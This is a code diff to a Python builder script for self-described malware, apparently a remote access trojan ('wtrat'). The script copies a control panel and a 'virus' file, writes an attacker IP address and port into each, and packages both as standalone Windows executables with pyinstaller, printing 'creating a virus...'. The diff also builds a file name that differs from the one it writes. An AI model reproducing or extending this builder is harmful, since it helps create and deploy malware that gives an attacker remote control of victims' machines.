@@ -2,6 +2,10 @@ import random
 import argparse
 import shutil
 import subprocess
+import os
+from assets.font.font import *
+
+print(random.choice(Font), "\n\n")
 
 def main():
     parser = argparse.ArgumentParser()
@@ -11,36 +15,41 @@ def main():
 
 args = main()
 
+if not os.path.exists("dist"):
+    os.makedirs("dist")
+else:
+    shutil.rmtree("dist")
+    os.makedirs("dist")
+
+print("creating a virus...\n")
+
 shutil.copy("panel.py", "dist")
 shutil.copy("virus.py", "dist")
 
-# panel.py dosyasını okurken ve yazarken
-with open("dist/panel.py", "r") as panel:
+with open("dist/panel.py", "r+") as panel:
     lines = panel.readlines()
-    insertIndex = 2
-    insertIndex2 = 3
-    data = f"ip = '{args.localhost}'\n"
-    data2 = f"port = {args.port}\n"
-
-with open("dist/panel.py", "w") as panel:
-    lines.insert(insertIndex, data)
-    lines.insert(insertIndex2, data2)
+    print("creating panel.py...")
+    lines.insert(2, f"ip = '{args.localhost}'\n")
+    lines.insert(3, f"port = {args.port}\n")
+    panel.seek(0)
     panel.writelines(lines)
+    panel.truncate()
+    print("panel.py created\n")
 
-with open("dist/virus.py", "r") as virus:
+with open("dist/virus.py", "r+") as virus:
     lines = virus.readlines()
-    insertIndex = 3
-    insertIndex2 = 4
-    data = f"ip = '{args.localhost}'\n"
-    daat2 = f"port = {args.port}\n"
-
-with open("dist/virus.py", "w") as virus:
-    lines.insert(insertIndex, data)
-    lines.insert(insertIndex2, data2)
+    print("creating virus.py...")
+    lines.insert(3, f"ip = '{args.localhost}'\n")
+    lines.insert(4, f"port = {args.port}\n")
+    virus.seek(0)
     virus.writelines(lines)
+    virus.truncate()
+    print("virus.py created\n")
 
-panelexe = "pyinstaller --onefile dist/panel.py"
+panelexe = "pyinstaller --onefile ./dist/panel.py"
 panel = subprocess.run(["powershell", "-Command", panelexe], capture_output=True, text=True)
 
-virusexe = "pyinstaller --onefile dist/virus.py"
+virusexe = "pyinstaller --onefile ./dist/wtrat.py"
 virus = subprocess.run(["powershell", "-Command", virusexe], capture_output=True, text=True)
+
+print("everything is ready")
